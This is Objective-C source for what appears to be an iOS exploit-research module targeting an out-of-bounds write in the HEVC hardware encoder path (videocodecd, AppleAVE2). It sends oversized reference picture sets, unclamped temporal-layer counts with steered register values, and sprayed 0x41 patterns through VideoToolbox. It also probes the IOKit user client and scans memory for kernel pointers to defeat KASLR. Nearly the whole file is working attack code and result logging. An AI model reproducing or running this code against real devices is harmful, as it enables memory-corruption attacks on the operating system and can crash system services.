// Executes a VideoToolbox stage on a detached queue with a hard wall-clock
// timeout and a live-shared output buffer so partial progress is NEVER lost
// even if a step inside the stage stalls.
static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimedOut, void (^block)(NSMutableString *out)) {
    NSMutableString *liveOut = [NSMutableString string];
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    dispatch_queue_t q = dispatch_queue_create("com.stealth.kexproofv4.h9.stage", DISPATCH_QUEUE_CONCURRENT);
    dispatch_async(q, ^{
        @try {
            if (block) block(liveOut);
        } @catch (NSException *ex) {
            KPH9OutAppend(liveOut, @"  [EXCEPTION in %@: %@]\n", label, ex.reason);
        }
        dispatch_semaphore_signal(sem);
    });
    dispatch_time_t deadline = dispatch_time(DISPATCH_TIME_NOW, timeoutMs * (int64_t)NSEC_PER_MSEC);
    if (dispatch_semaphore_wait(sem, deadline) != 0) {
        BOOL alive = KPH9IsVideoCodecdAlive();
        if (outTimedOut) *outTimedOut = !alive;
        NSString *partial = nil;
        @synchronized (liveOut) {
            partial = [liveOut copy];
        }
        return [NSString stringWithFormat:
                @"%@  [TIMEOUT %lld ms in %@ — videocodecd XPC %@]\n",
                partial ?: @"", timeoutMs, label,
                alive ? @"ALIVE (stage-local stall only; continuing)" : @"UNRESPONSIVE / THROTTLED"];
    }
    if (outTimedOut) *outTimedOut = NO;
    @synchronized (liveOut) {
        return [liveOut copy];
    }
}

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve & DPB/NTL audit (bounded XPC)";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)resetJournal {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    [[NSFileManager defaultManager] createFileAtPath:path contents:[NSData data] attributes:nil];
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[h9] %@", line];
}

- (NSString *)runReport {
    [self resetJournal];
    [self journal:@"=== H9 clean rebuild start ==="];

    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write (Clean Rebuild) ===\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d pid=%d\n",
     UIDevice.currentDevice.systemVersion, getuid(), getpid()];

    BOOL vtHung = NO;

    // -------------------------------------------------------------------------
    // Stage 1: AVE_HEVC_ST_RPS_Retrieve (UserRPSForFaceTime 2+2 vs 32+32 OOB)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 1: RPS OOB probe"];
    [report appendString:@"\n--- Stage 1: AVE_HEVC_ST_RPS_Retrieve (UserRPSForFaceTime) ---\n"];
    NSString *s1 = KPH9RunTimed(@"Stage1-RPS", 5000, &vtHung, ^(NSMutableString *out) {
        NSMutableArray *cbSink = [NSMutableArray array];
        CFTypeRef retainedSink = CFRetain((__bridge CFTypeRef)cbSink);
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        VTCompressionSessionRef s = NULL;
        OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                 kCMVideoCodecType_HEVC,
                                                 (__bridge CFDictionaryRef)spec,
                                                 NULL, NULL, KPH9AttsCB,
                                                 (void *)retainedSink, &s);
        KPH9OutAppend(out, @"  session create -> %d\n", (int)st);
        if (st != noErr || !s) {
            CFRelease(retainedSink);
            return;
        }

        VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        KPH9PrimeRealTime(s);
        OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
        KPH9OutAppend(out, @"  prepare -> %d\n", (int)prep);

        NSMutableArray *s0s = [NSMutableArray array], *s1s = [NSMutableArray array];
        for (int i = 0; i < 2; i++) { [s0s addObject:@(-(i + 1))]; [s1s addObject:@(i + 1)]; }
        NSDictionary *rpsSane = @{
            @"AbsDeltaRPSMinus1": s0s, @"DeltaRPSSign": s1s,
            @"NumNegativePics": @2, @"NumPositivePics": @2,
            @"UsedByCurrPicS0": @3U, @"UsedByCurrPicS1": @3U,
        };

        NSMutableArray *s0oob = [NSMutableArray array], *s1oob = [NSMutableArray array];
        for (int i = 0; i < 32; i++) { [s0oob addObject:@(-(i + 1))]; [s1oob addObject:@(i + 1)]; }
        NSDictionary *rpsOOB = @{
            @"AbsDeltaRPSMinus1": s0oob, @"DeltaRPSSign": s1oob,
            @"NumNegativePics": @32, @"NumPositivePics": @32,
            @"UsedByCurrPicS0": @0xFFFFFFFFU, @"UsedByCurrPicS1": @0xFFFFFFFFU,
        };

        OSStatus stSane = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsSane]);
        OSStatus stOOB  = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsOOB]);
        KPH9OutAppend(out, @"  session set UserRPS sane(2+2)=%d oob(32+32)=%d\n", (int)stSane, (int)stOOB);

        CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
        if (pb) {
            @synchronized (cbSink) { [cbSink removeAllObjects]; }
            OSStatus e0 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
            if (e0 == noErr) KPH9Drain(cbSink, 1, 60);
            NSString *cb0 = nil;
            @synchronized (cbSink) { cb0 = cbSink.firstObject ?: @"(no cb)"; [cbSink removeAllObjects]; }
            KPH9OutAppend(out, @"  encode[0] clean IDR -> %d (%@)\n", (int)e0, cb0);

            NSDictionary *fp = @{
                @"UserRPSForFaceTime": @[rpsOOB],
                @"AbsDeltaRPSMinus1": s0oob,
                @"DeltaRPSSign": s1oob,
            };
            OSStatus e1 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(1, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
            if (e1 == noErr) KPH9Drain(cbSink, 1, 80);

            // Push 4 clean P-frames (pts 2..5) so pts=1 and pts=2..3 exit any 3-frame lookahead window
            // without calling VTCompressionSessionCompleteFrames.
            OSStatus e2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(2, 30), kCMTimeInvalid, NULL, NULL, NULL);
            OSStatus e3 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(3, 30), kCMTimeInvalid, NULL, NULL, NULL);
            VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(4, 30), kCMTimeInvalid, NULL, NULL, NULL);
            VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(5, 30), kCMTimeInvalid, NULL, NULL, NULL);
            if (e2 == noErr || e3 == noErr) KPH9Drain(cbSink, 2, 120);
            NSString *cb1 = nil, *cb2 = nil;
            @synchronized (cbSink) {
                cb1 = cbSink.firstObject ?: @"(no cb)";
                if (cbSink.count > 1) {
                    NSArray *rest = [cbSink subarrayWithRange:NSMakeRange(1, cbSink.count - 1)];
                    cb2 = [rest componentsJoinedByString:@" | "];
                } else {
                    cb2 = @"(no cb)";
                }
            }
            KPH9OutAppend(out, @"  encode[1] frameProps RPS(32+32) -> %d (%@)\n", (int)e1, cb1);
            KPH9OutAppend(out, @"  encode[2..3] post-smash P-frames -> %d/%d (%@)\n", (int)e2, (int)e3, cb2);
            CVPixelBufferRelease(pb);
        }

        KPH9SafeTeardownEx(s, retainedSink, NULL);
    });
    [report appendString:s1];

    // -------------------------------------------------------------------------
    // Stage 2: NumberOfTemporalLayers (NTL) Unclamp & Steered x0 Audit
    //   2A: with ExpectedFrameRate=60 / BaseLayerFrameRate=15 (dyadic clamp -> 3)
    //   2B: raw EncoderUsage=1 without BaseLayerFrameRate (unclamped readback)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 2: NTL unclamp & steered x0 (60/15 clamped vs raw unclamped)"];
    [report appendString:@"\n--- Stage 2: NTL Unclamp & Steered x0 Audit ---\n"];
    if (vtHung) {
        [report appendString:@"  skipped (videocodecd XPC unresponsive)\n"];
    } else {
        NSString *s2 = KPH9RunTimed(@"Stage2-NTL", 5000, &vtHung, ^(NSMutableString *out) {
            CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
            int ntlVals[] = { 3, 8, 16000, 16447 };
            KPH9OutAppend(out, @"  [2A: with ExpectedFrameRate=60 / BaseLayerFrameRate=15 -> dyadic clamp 1+log2(60/15)=3]\n");
            for (int i = 0; i < 4; i++) {
                int ntl = ntlVals[i];
                uint64_t x0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
                NSDictionary *spec = @{
                    @"EncoderUsage": @1,
                    @"NumberOfTemporalLayers": @(ntl),
                    @"AllowTemporalCompression": @YES,
                };
                VTCompressionSessionRef s = NULL;
                OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                         kCMVideoCodecType_HEVC,
                                                         (__bridge CFDictionaryRef)spec,
                                                         NULL, NULL, NULL, NULL, &s);
                if (st != noErr || !s) {
                    KPH9OutAppend(out, @"  60/15 NTL=%-5d create=%d\n", ntl, (int)st);
                    continue;
                }
                VTSessionSetProperty(s, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                VTSessionSetProperty(s, CFSTR("RealTime"), kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));

                int pre = -1, post = -1;
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &pre);
                    CFRelease(rb);
                }
                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
                rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &post);
                    CFRelease(rb);
                }
                OSStatus enc = -1;
                if (pb) {
                    enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                }
                KPH9OutAppend(out, @"  60/15 NTL=%-5d x0=0x%016llx prep=%d PRE=%d POST=%d enc=%d\n",
                              ntl, x0, (int)prep, pre, post, (int)enc);
                KPH9SafeTeardown(s);
            }

            KPH9OutAppend(out, @"  [2B: raw EncoderUsage=1 without BaseLayerFrameRate -> unclamped NTL]\n");
            int rawVals[] = { 3, 8, 16000, 16447, 16463 };
            for (int i = 0; i < 5; i++) {
                int ntl = rawVals[i];
                uint64_t x0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
                VTCompressionSessionRef s = NULL;
                OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                         kCMVideoCodecType_HEVC,
                                                         NULL, NULL, NULL, NULL, NULL, &s);
                if (st != noErr || !s) {
                    KPH9OutAppend(out, @"  raw   NTL=%-5d create=%d\n", ntl, (int)st);
                    continue;
                }
                OSStatus uSt = VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                OSStatus nSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
                int pre = -1, post = -1;
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &pre);
                    CFRelease(rb);
                }
                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
                rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &post);
                    CFRelease(rb);
                }
                NSString *encStr = @"deferred-to-sprite";
                if (pb && ntl <= 8) {
                    OSStatus enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    encStr = [NSString stringWithFormat:@"%d", (int)enc];
                }
                KPH9OutAppend(out, @"  raw   NTL=%-5d x0=0x%016llx usage=%d set=%d PRE=%d prep=%d POST=%d enc=%@\n",
                              ntl, x0, (int)uSt, (int)nSt, pre, (int)prep, post, encStr);
                KPH9SafeTeardown(s);
            }
            if (pb) CVPixelBufferRelease(pb);
        });
        [report appendString:s2];
    }

    // -------------------------------------------------------------------------
    // Stage 3: UserDPBFramesForFaceTime CFNumber Slot & Cutoff Audit
    // (Strictly CFNumber elements — NSData/NSDictionary trigger uncaught
    // -[_getValue:forType:] SIGABRT in videocodecd -> launchd 320s throttle)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 3: UserDPBFramesForFaceTime CFNumber probe (32..64 boundary)"];
    [report appendString:@"\n--- Stage 3: UserDPBFramesForFaceTime (CFNumber Safe Probe) ---\n"];
    if (vtHung) {
        [report appendString:@"  skipped (videocodecd XPC unresponsive)\n"];
    } else {
        NSString *s3 = KPH9RunTimed(@"Stage3-DPB", 15000, &vtHung, ^(NSMutableString *out) {
            NSMutableArray *cbSink = [NSMutableArray array];
            CFTypeRef retainedSink = CFRetain((__bridge CFTypeRef)cbSink);
            NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
            VTCompressionSessionRef s = NULL;
            OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                     kCMVideoCodecType_HEVC,
                                                     (__bridge CFDictionaryRef)spec,
                                                     NULL, NULL, KPH9AttsCB,
                                                     (void *)retainedSink, &s);
            if (st != noErr || !s) {
                KPH9OutAppend(out, @"  session create -> %d\n", (int)st);
                CFRelease(retainedSink);
                return;
            }
            VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            VTCompressionSessionPrepareToEncodeFrames(s);

            CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
            int64_t pts = 0;
            if (pb) {
                @synchronized (cbSink) { [cbSink removeAllObjects]; }
                if (VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid, NULL, NULL, NULL) == noErr) {
                    KPH9Drain(cbSink, 1, 60);
                }
            }

            // Analyst strike 2/3: full 17..32 matrix + exact cutoff 32..64,
            // each row tested on TWO P-frames (DPB matching bites beyond IDR).
            int counts[] = { 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28,
                             29, 30, 31, 32, 33, 34, 48, 63, 64 };
            int nCounts = (int)(sizeof(counts) / sizeof(counts[0]));
            for (int ci = 0; ci < nCounts; ci++) {
                int n = counts[ci];
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
                for (int k = 0; k < n; k++) [arr addObject:@(k)];
                OSStatus sp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
                OSStatus fe = -1, fe2 = -1;
                if (pb) {
                    @synchronized (cbSink) { [cbSink removeAllObjects]; }
                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                    fe = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
                    fe2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
                    if (fe == noErr || fe2 == noErr) KPH9Drain(cbSink, 2, 80);
                }
                NSString *cb = nil;
                @synchronized (cbSink) {
                    cb = cbSink.count ? [cbSink componentsJoinedByString:@" | "] : @"(no cb)";
                }
                KPH9OutAppend(out, @"  dpb[num0 x%-2d] set=%d enc=%d/%d cb=%@\n", n, (int)sp, (int)fe, (int)fe2, cb);
            }

            long long vals[] = { 15, 16, 32, -1, 0x4141414141414141LL };
            for (int vi = 0; vi < 5; vi++) {
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:16];
                for (int k = 0; k < 16; k++) [arr addObject:@(vals[vi])];
                OSStatus sp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
                OSStatus fe = -1, fe2 = -1;
                if (pb) {
                    @synchronized (cbSink) { [cbSink removeAllObjects]; }
                    NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                    fe = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                         (__bridge CFDictionaryRef)fp, NULL, NULL);
                    fe2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(pts++, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
                    if (fe == noErr || fe2 == noErr) KPH9Drain(cbSink, 2, 80);
                }
                NSString *cb = nil;
                @synchronized (cbSink) {
                    cb = cbSink.count ? [cbSink componentsJoinedByString:@" | "] : @"(no cb)";
                }
                KPH9OutAppend(out, @"  dpb[val=0x%llx x16] set=%d enc=%d/%d cb=%@\n", vals[vi], (int)sp, (int)fe, (int)fe2, cb);
            }

            if (pb) CVPixelBufferRelease(pb);
            KPH9SafeTeardownEx(s, retainedSink, NULL);
        });
        [report appendString:s3];
    }

    // -------------------------------------------------------------------------
    // Stage 4: Direct AppleAVE2 IOKit UserClient Check
    // -------------------------------------------------------------------------
    [self journal:@"Stage 4: Direct AppleAVE2 IOKit probe"];
    [report appendString:@"\n--- Stage 4: Direct AppleAVE2 IOKit Probe ---\n"];
    kp_io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2"));
    [report appendFormat:@"  AppleAVE2 service=%u\n", svc];
    if (svc) {
        kp_io_connect_t conn = 0;
        kern_return_t ok = IOServiceOpen(svc, (unsigned int)mach_task_self(), 0, &conn);
        [report appendFormat:@"  IOServiceOpen -> 0x%x (conn=%u)\n", ok, conn];
        if (ok == KERN_SUCCESS && conn) {
            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
    } else {
        [report appendString:@"  AppleAVE2 not exposed to sandbox\n"];
    }

    // -------------------------------------------------------------------------
    // Stage 5: Safe VM / KASLR Candidate Scan (vm_read_overwrite)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 5: Safe VM candidate scan"];
    [report appendString:@"\n--- Stage 5: Safe VM / KASLR Candidate Scan ---\n"];
    vm_address_t addr = 0;
    vm_size_t size = 0;
    uint32_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
    uint64_t pageBuf[512];
    int candidates = 0;
    for (int iter = 0; iter < 160 && candidates < 64; iter++) {
        count = VM_REGION_SUBMAP_INFO_COUNT_64;
        if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                 (vm_region_recurse_info_t)&info, &count) != KERN_SUCCESS || size == 0) {
            break;
        }
        if (info.is_submap) {
            depth++;
            continue;
        }
        if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
            size <= 8 * 1024 * 1024 &&
            !KPVMShouldSkipRegion(&info, addr, size, &depth, NULL, NULL, 0)) {
            vm_size_t maxBytes = (size < 16384) ? size : 16384;
            for (vm_size_t off = 0; off + sizeof(pageBuf) <= maxBytes && candidates < 64; off += sizeof(pageBuf)) {
                vm_size_t outSz = 0;
                if (vm_read_overwrite(mach_task_self(), addr + off, sizeof(pageBuf),
                                      (vm_address_t)pageBuf, &outSz) != KERN_SUCCESS ||
                    outSz < sizeof(uint64_t)) {
                    break;
                }
                size_t words = outSz / sizeof(uint64_t);
                for (size_t w = 0; w < words && candidates < 64; w++) {
                    uint64_t v = pageBuf[w];
                    if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                        candidates++;
                    }
                }
            }
        }
        if (addr + size <= addr) break;
        addr += size;
    }
    [report appendFormat:@"  filtered kernel pointer candidates: %d\n", candidates];

    // -------------------------------------------------------------------------
    // Stage 6: XPC bitstream / NAL / attachments leak + exact DPB boundary
    // -------------------------------------------------------------------------
    [self journal:@"Stage 6: XPC bitstream leak & DPB boundary"];
    if (vtHung) {
        [report appendString:@"\n--- Stage 6 skipped (videocodecd XPC unresponsive) ---\n"];
    } else {
        NSString *s6 = KPH9RunTimed(@"Stage6-XPC", 15000, &vtHung, ^(NSMutableString *out) {
            RunStage6_XPCLeakAndBoundaryAudit(out);
        });
        [report appendString:s6];
    }

    // -------------------------------------------------------------------------
    // Stage 7: -17691 malfunction matrix + UserRPS container ladder
    // -------------------------------------------------------------------------
    [self journal:@"Stage 7: -17691 matrix + UserRPS containers"];
    if (vtHung) {
        [report appendString:@"\n--- Stage 7 skipped (videocodecd XPC unresponsive) ---\n"];
    } else {
        NSString *s7 = KPH9RunTimed(@"Stage7-Matrix", 25000, &vtHung, ^(NSMutableString *out) {
            RunStage7_MalfunctionMatrix(out);
        });
        [report appendString:s7];
    }

    [report appendFormat:@"\nVERDICT: %@\n", vtHung ? @"VIDEOCODECD_XPC_TIMEOUT (reboot device to clear wedged daemon)" : @"COMPLETED_CLEAN"];

    [self journal:@"=== H9 clean rebuild complete ==="];
    return report;
}

@end
